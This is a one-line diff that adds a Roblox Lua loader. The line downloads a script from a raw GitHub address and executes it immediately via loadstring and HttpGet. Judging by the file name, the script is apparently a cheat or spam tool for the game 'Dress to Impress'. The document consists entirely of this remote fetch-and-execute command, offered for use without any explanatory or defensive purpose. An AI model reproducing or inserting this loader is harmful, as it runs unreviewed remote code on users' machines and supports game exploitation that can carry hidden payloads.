@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/new-quest-dress-to-impress-spam3-42jg4lzsmdj8gk.lua"))()
